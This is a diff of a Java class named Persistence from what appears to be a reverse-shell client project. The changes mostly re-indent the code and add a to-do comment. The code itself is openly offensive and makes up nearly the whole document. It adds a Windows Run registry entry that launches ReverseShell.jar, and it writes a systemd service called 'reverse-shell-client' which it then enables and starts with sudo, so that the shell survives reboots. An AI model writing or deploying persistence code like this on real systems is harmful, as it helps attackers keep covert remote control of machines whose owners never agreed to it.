@@ -6,31 +6,33 @@ import java.nio.file.Paths;
 
 public class Persistence {
 
-    public static void setup() {
-        if (OSUtils.isWindows()) {
-            addToRegistry();
-        } else {
-            addSystemdService();
-        }
-    }
+	//Yeah, this doesn't do anything yet
+	//ToDo -- Make this actually do shit
+	public static void setup() {
+		if (OSUtils.isWindows()) {
+			addToRegistry();
+		} else {
+			addSystemdService();
+		}
+	}
 
-    //Windows
-    public static void addToRegistry() {
-        try {
-            String command = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v ReverseShell /t REG_SZ /d \"java -jar path\\to\\ReverseShell.jar\" /f";
-            Process process = Runtime.getRuntime().exec(command);
-            process.waitFor();
-            System.out.println("[*] Persistence set via Windows Registry");
-        } catch (IOException | InterruptedException e) {
-            System.err.println("[ERROR] Failed to set persistence: " + e.getMessage());
-        }
-    }
+	//Windows
+	public static void addToRegistry() {
+		try {
+			String command = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v ReverseShell /t REG_SZ /d \"java -jar path\\to\\ReverseShell.jar\" /f";
+			Process process = Runtime.getRuntime().exec(command);
+			process.waitFor();
+			System.out.println("[*] Persistence set via Windows Registry");
+		} catch (IOException | InterruptedException e) {
+			System.err.println("[ERROR] Failed to set persistence: " + e.getMessage());
+		}
+	}
 
-    //Linux
-    public static void addSystemdService() {
-        try {
-            String serviceContent
-                    = """
+	//Linux
+	public static void addSystemdService() {
+		try {
+			String serviceContent
+				= """
                       [Unit]
                       Description=Reverse Shell Client
                       After=network.target
@@ -46,21 +48,21 @@ public class Persistence {
                       WantedBy=multi-user.target
                       """;
 
-            String serviceFilePath = "/etc/systemd/system/reverse-shell-client.service";
-            Files.write(Paths.get(serviceFilePath), serviceContent.getBytes());
+			String serviceFilePath = "/etc/systemd/system/reverse-shell-client.service";
+			Files.write(Paths.get(serviceFilePath), serviceContent.getBytes());
 
-            Process reloadProcess = Runtime.getRuntime().exec("sudo systemctl daemon-reload");
-            reloadProcess.waitFor();
+			Process reloadProcess = Runtime.getRuntime().exec("sudo systemctl daemon-reload");
+			reloadProcess.waitFor();
 
-            Process enableProcess = Runtime.getRuntime().exec("sudo systemctl enable reverse-shell-client.service");
-            enableProcess.waitFor();
+			Process enableProcess = Runtime.getRuntime().exec("sudo systemctl enable reverse-shell-client.service");
+			enableProcess.waitFor();
 
-            Process startProcess = Runtime.getRuntime().exec("sudo systemctl start reverse-shell-client.service");
-            startProcess.waitFor();
+			Process startProcess = Runtime.getRuntime().exec("sudo systemctl start reverse-shell-client.service");
+			startProcess.waitFor();
 
-            System.out.println("[*] Persistence set via systemd service");
-        } catch (IOException | InterruptedException e) {
-            System.err.println("[ERROR] Failed to set persistence via systemd: " + e.getMessage());
-        }
-    }
+			System.out.println("[*] Persistence set via systemd service");
+		} catch (IOException | InterruptedException e) {
+			System.err.println("[ERROR] Failed to set persistence via systemd: " + e.getMessage());
+		}
+	}
 }
